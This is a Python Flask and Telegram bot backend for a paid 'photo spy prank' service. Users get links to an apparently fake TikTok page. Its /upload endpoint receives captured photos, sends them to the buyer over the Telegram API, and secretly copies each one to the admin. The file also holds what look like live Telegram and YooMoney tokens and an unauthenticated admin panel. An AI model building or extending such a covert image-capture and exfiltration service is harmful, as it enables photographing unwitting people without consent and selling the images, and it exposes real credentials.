import sqlite3
import datetime
import uuid
import time
import json
import threading
import requests
from flask import Flask, request, jsonify, render_template
from yoomoney import Client, Quickpay

# ======================================================
#  КОНФИГ
# ======================================================
BOT_TOKEN = "8305233302:AAHf3mBUH5rIsQWZF4tF9nAyHvakCBbQIps"
BASE_URL = "https://nomadru.github.io/tiktokfake"
ADMIN_CHAT_ID = 8533142719
FREE_TRIAL_PHOTOS = 2
ADMIN_USERNAME = "pytin_legend"

# ---------- ЮMoney ----------
YOOMONEY_TOKEN = "4B2E96645E91CFE9026C2C1D3198EA0B318C42F51982ACD2EF8F2B7ECAF19383"
YOOMONEY_RECEIVER = "4100118843465904"   # ← ЗДЕСЬ ВСТАВЬ СВОЙ НОМЕР КОШЕЛЬКА (например, 410011234567890)
YOOMONEY_REDIRECT = "https://t.me/@photoshoionprank_bot"   # можно ссылку на бота

# ---------- Тарифы (цена в рублях, кол-во фото) ----------
TARIFFS = [
    {"photos": 1,  "price": 5},
    {"photos": 10, "price": 30},
    {"photos": 100, "price": 250}
]

# ======================================================
#  БАЗА ДАННЫХ
# ======================================================
def init_db():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            ref TEXT UNIQUE,
            subscription_end TEXT,
            photos_limit INTEGER,
            used_photos INTEGER DEFAULT 0,
            tariff_name TEXT,
            referrer_id INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def add_user(chat_id, ref, end_date, limit, tariff, referrer_id=None):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, ref, subscription_end, photos_limit, used_photos, tariff_name, referrer_id, referral_count)
        VALUES (?, ?, ?, ?, 0, ?, ?, 0)
    ''', (chat_id, ref, end_date, limit, tariff, referrer_id))
    conn.commit()
    conn.close()

def get_user(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT ref, subscription_end, photos_limit, used_photos, referrer_id, referral_count FROM users WHERE chat_id=?', (chat_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_ref(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, subscription_end, photos_limit, used_photos, referrer_id FROM users WHERE ref=?', (ref,))
    row = c.fetchone()
    conn.close()
    return row

def update_user_limit(chat_id, new_limit):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET photos_limit = ? WHERE chat_id = ?', (new_limit, chat_id))
    conn.commit()
    conn.close()

def increment_used_photos(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET used_photos = used_photos + 1 WHERE ref=?', (ref,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, ref, photos_limit, used_photos, subscription_end, referral_count FROM users')
    rows = c.fetchall()
    conn.close()
    return rows

def increment_referral_count(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET referral_count = referral_count + 1 WHERE chat_id = ?', (chat_id,))
    conn.commit()
    conn.close()

# ======================================================
#  РЕФЕРАЛЬНАЯ СИСТЕМА
# ======================================================
def get_ref_link(chat_id):
    return f"https://t.me/твой_бот?start=ref_{chat_id}"

# ======================================================
#  ЮMoney (создание платежа)
# ======================================================
def create_payment(chat_id, amount, description, tariff_photos):
    client = Client(YOOMONEY_TOKEN)
    quickpay = Quickpay(
        receiver=YOOMONEY_RECEIVER,
        quickpay_form="shop",
        targets=f"{description} ({tariff_photos} фото)",
        paymentType="SB",
        sum=amount,
        label=str(chat_id)
    )
    return quickpay.redirected_url

def check_payment(chat_id):
    client = Client(YOOMONEY_TOKEN)
    history = client.operation_history(label=str(chat_id))
    for op in history.operations:
        if op.status == "success":
            return True
    return False

# ======================================================
#  БОТ (отправка сообщений, клавиатуры, обработчики)
# ======================================================
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=data)

def answer_callback(callback_id, text=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
    requests.post(url, json=data)

def main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔗 Получить ссылку", "callback_data": "get_link"}],
            [{"text": "📊 Моя подписка", "callback_data": "my_sub"}],
            [{"text": "💰 Купить фото", "callback_data": "buy_photo"}],
            [{"text": "👥 Пригласить друга", "callback_data": "invite"}],
            [{"text": "📈 Мои рефералы", "callback_data": "my_refs"}]
        ]
    }

def back_keyboard():
    return {"inline_keyboard": [[{"text": "🔙 Назад", "callback_data": "back"}]]}

def tariffs_keyboard():
    kb = {"inline_keyboard": []}
    for t in TARIFFS:
        kb["inline_keyboard"].append([
            {"text": f"{t['photos']} фото – {t['price']} руб", "callback_data": f"tariff_{t['photos']}_{t['price']}"}
        ])
    kb["inline_keyboard"].append([{"text": "🔙 Назад", "callback_data": "back"}])
    return kb

def handle_start(chat_id, text=None):
    referrer_id = None
    if text and text.startswith("/start ref_"):
        try:
            referrer_id = int(text.split("_")[1])
        except:
            pass

    row = get_user(chat_id)
    if not row:
        ref = str(uuid.uuid4())[:8]
        end_date = (datetime.datetime.now() + datetime.timedelta(days=365)).isoformat()
        add_user(chat_id, ref, end_date, FREE_TRIAL_PHOTOS, "Тестовый", referrer_id)

        if referrer_id:
            referrer_data = get_user(referrer_id)
            if referrer_data:
                ref_ref, end, limit, used, _, _ = referrer_data
                new_limit = limit + 1
                update_user_limit(referrer_id, new_limit)
                increment_referral_count(referrer_id)
                send_message(referrer_id, f"🎉 Твой друг перешёл по ссылке! Тебе начислено +1 фото. Новый лимит: {new_limit}")

        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🎉 Добро пожаловать в <b>ФотоШпион Пранк Бот</b>!\n\n"
            f"Ты получил <b>{FREE_TRIAL_PHOTOS} тестовых фото</b> бесплатно!\n"
            f"Твоя ссылка:\n<code>{link}</code>\n\n"
            f"После теста — купи фото через меню.",
            reply_markup=main_keyboard()
        )
    else:
        send_message(chat_id, "👋 С возвращением!\n\nВыбери действие:", reply_markup=main_keyboard())

def handle_callback(chat_id, callback_id, data):
    if data == "get_link":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала активируй подписку (напиши /start).", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, _ = row
        remaining = limit - used
        if remaining <= 0:
            send_message(chat_id, "❌ У тебя закончились фото. Купи новые через меню.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🔗 Твоя ссылка:\n<code>{link}</code>\n\nОсталось фото: {remaining}",
            reply_markup=back_keyboard()
        )
        answer_callback(callback_id)

    elif data == "my_sub":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "У тебя нет активной подписки. Напиши /start", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, referral_count = row
        remaining = limit - used
        status = "✅ Активна" if remaining > 0 else "❌ Исчерпана"
        text = (
            f"📊 <b>Твоя подписка</b>\n\n"
            f"• Статус: {status}\n"
            f"• Осталось фото: {remaining}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Реф-код: <code>{ref}</code>\n"
            f"• Привёл друзей: {referral_count}"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "buy_photo":
        send_message(chat_id, "📸 Выбери тариф:", reply_markup=tariffs_keyboard())
        answer_callback(callback_id)

    elif data.startswith("tariff_"):
        # data = tariff_1_5, tariff_10_30, tariff_100_250
        parts = data.split("_")
        photos = int(parts[1])
        price = int(parts[2])
        payment_url = create_payment(chat_id, price, f"Оплата {photos} фото", photos)
        send_message(chat_id,
            f"💳 Для покупки <b>{photos} фото</b> переведи <b>{price} руб</b> по ссылке:\n"
            f"<code>{payment_url}</code>\n\n"
            f"После оплаты нажми «Проверить оплату».",
            reply_markup={"inline_keyboard": [
                [{"text": "✅ Проверить оплату", "callback_data": "check_payment"}],
                [{"text": "🔙 Назад", "callback_data": "back"}]
            ]}
        )
        answer_callback(callback_id)

    elif data == "check_payment":
        if check_payment(chat_id):
            # Начисляем фото (по умолчанию 1, но если платили за 10 или 100, нужно знать сколько)
            # Мы не храним в платеже количество фото, поэтому используем последний выбранный тариф.
            # Для простоты будем начислять 1 фото за любую оплату, но лучше хранить сумму и определять тариф.
            # Сделаем так: если сумма 5 руб – 1 фото, 30 руб – 10 фото, 250 руб – 100 фото.
            # Получим сумму из истории – но проще запросить у пользователя ввести сумму или использовать фиксированные тарифы.
            # Реализуем через проверку последнего успешного платежа.
            client = Client(YOOMONEY_TOKEN)
            history = client.operation_history(label=str(chat_id))
            for op in history.operations:
                if op.status == "success":
                    amount = op.amount
                    if amount == 5:
                        photos_to_add = 1
                    elif amount == 30:
                        photos_to_add = 10
                    elif amount == 250:
                        photos_to_add = 100
                    else:
                        photos_to_add = 1  # на всякий случай
                    row = get_user(chat_id)
                    if row:
                        ref, end_date, limit, used, _, _ = row
                        new_limit = limit + photos_to_add
                        update_user_limit(chat_id, new_limit)
                        send_message(chat_id, f"✅ Оплата подтверждена! Тебе начислено {photos_to_add} фото. Новый лимит: {new_limit}")
                    break
            else:
                send_message(chat_id, "❌ Платёж не найден. Попробуй позже или проверь ссылку.", reply_markup=main_keyboard())
        else:
            send_message(chat_id, "❌ Платёж не найден. Попробуй позже или проверь ссылку.", reply_markup=main_keyboard())
        answer_callback(callback_id)

    elif data == "invite":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref_link = get_ref_link(chat_id)
        send_message(chat_id,
            f"👥 Пригласи друга по этой ссылке:\n<code>{ref_link}</code>\n\n"
            f"Когда друг перейдёт и сделает первое фото — ты получишь <b>+1 фото</b> на баланс!",
            reply_markup={"inline_keyboard": [[{"text": "📋 Скопировать", "url": ref_link}]]}
        )
        answer_callback(callback_id)

    elif data == "my_refs":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, referral_count = row
        text = (
            f"📈 <b>Твои рефералы</b>\n\n"
            f"• Приглашено друзей: {referral_count}\n"
            f"• Бонусных фото получено: {referral_count} (по 1 за каждого)"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "back":
        send_message(chat_id, "Главное меню:", reply_markup=main_keyboard())
        answer_callback(callback_id)

def handle_admin_command(chat_id, text):
    if chat_id != ADMIN_CHAT_ID:
        return False
    parts = text.split()
    cmd = parts[0].lower()
    if cmd == "/addphotos":
        if len(parts) < 3:
            send_message(chat_id, "❌ Используй: /addphotos <ref> <количество>")
            return True
        ref = parts[1]
        try:
            add_count = int(parts[2])
        except:
            send_message(chat_id, "❌ Количество должно быть числом")
            return True
        user = get_user_by_ref(ref)
        if not user:
            send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
            return True
        chat_id_u, end_date, old_limit, used, _ = user
        new_limit = old_limit + add_count
        update_user_limit(chat_id_u, new_limit)
        send_message(chat_id, f"✅ Добавлено {add_count} фото для {ref}. Новый лимит: {new_limit}")
        send_message(chat_id_u, f"✅ Админ добавил тебе {add_count} фото. Новый лимит: {new_limit}")
        return True
    elif cmd == "/listusers":
        users = get_all_users()
        if not users:
            send_message(chat_id, "📭 Нет пользователей")
            return True
        msg = "📋 <b>Список пользователей:</b>\n\n"
        for u in users:
            chat_id_u, ref, limit, used, end, ref_count = u
            remaining = limit - used
            msg += f"• {ref} | осталось: {remaining} | всего: {limit} | рефералов: {ref_count}\n"
        send_message(chat_id, msg)
        return True
    elif cmd == "/info":
        if len(parts) < 2:
            send_message(chat_id, "❌ Используй: /info <ref>")
            return True
        ref = parts[1]
        user = get_user_by_ref(ref)
        if not user:
            send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
            return True
        chat_id_u, end_date, limit, used, _ = user
        remaining = limit - used
        send_message(chat_id,
            f"📊 <b>Информация о {ref}</b>\n\n"
            f"• Chat ID: {chat_id_u}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Осталось: {remaining}\n"
            f"• Срок: {end_date}"
        )
        return True
    else:
        return False

def bot_polling():
    last_update_id = 0
    print("🤖 Бот запущен в фоне")
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            updates = resp.json().get("result", [])
            for upd in updates:
                last_update_id = upd["update_id"]
                if "message" in upd:
                    msg = upd["message"]
                    chat_id = msg["chat"]["id"]
                    if "text" in msg:
                        text = msg["text"]
                        if text.startswith("/start"):
                            handle_start(chat_id, text)
                        else:
                            if text.startswith("/"):
                                handled = handle_admin_command(chat_id, text)
                                if handled:
                                    continue
                if "callback_query" in upd:
                    cb = upd["callback_query"]
                    chat_id = cb["from"]["id"]
                    callback_id = cb["id"]
                    data = cb["data"]
                    handle_callback(chat_id, callback_id, data)
        except Exception as e:
            print("Ошибка бота:", e)
            time.sleep(5)

# ======================================================
#  FLASK (веб-сервер)
# ======================================================
app = Flask(__name__)

@app.before_request
def log_request():
    print(f"➡️ {request.method} {request.path} args={request.args}")

@app.route('/upload', methods=['POST'])
def upload():
    ref = request.args.get('ref')
    if not ref:
        return jsonify({'error': 'Missing ref'}), 400
    if 'photo' not in request.files:
        return jsonify({'error': 'No photo'}), 400
    photo = request.files['photo']
    user = get_user_by_ref(ref)
    if not user:
        return jsonify({'error': 'Invalid ref'}), 403
    chat_id, end_date, limit, used, _ = user
    now = datetime.datetime.now()
    if now > datetime.datetime.fromisoformat(end_date):
        return jsonify({'error': 'Subscription expired'}), 403
    if used >= limit:
        return jsonify({'error': 'Limit exceeded'}), 403

    # Отправляем фото пользователю
    files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data_user = {'chat_id': chat_id, 'caption': f"📸 Ваше фото (ref: {ref})"}
    resp_user = requests.post(url, data=data_user, files=files)
    if resp_user.status_code != 200:
        return jsonify({'error': 'Telegram send to user failed'}), 500

    # Копия админу
    photo.seek(0)
    files_copy = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    data_admin = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Копия от {ref}"}
    requests.post(url, data=data_admin, files=files_copy)

    increment_used_photos(ref)
    return jsonify({'status': 'ok'})

@app.route('/admin')
def admin_panel():
    users = get_all_users()
    total_users = len(users)
    total_photos = sum(u[2] for u in users)
    return render_template('admin.html', users=users, total_users=total_users, total_photos=total_photos)

@app.route('/admin/add', methods=['POST'])
def admin_add():
    ref = request.form.get('ref')
    count = request.form.get('count', type=int)
    if not ref or not count:
        return 'Неверные данные', 400
    user = get_user_by_ref(ref)
    if not user:
        return f'Пользователь {ref} не найден', 404
    chat_id, end_date, limit, used, _ = user
    new_limit = limit + count
    update_user_limit(chat_id, new_limit)
    send_message(chat_id, f"✅ Админ добавил {count} фото. Новый лимит: {new_limit}")
    return 'OK', 200

# ======================================================
#  ЗАПУСК
# ======================================================
if __name__ == '__main__':
    init_db()
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()
    app.run(host='0.0.0.0', port=5000, debug=False)
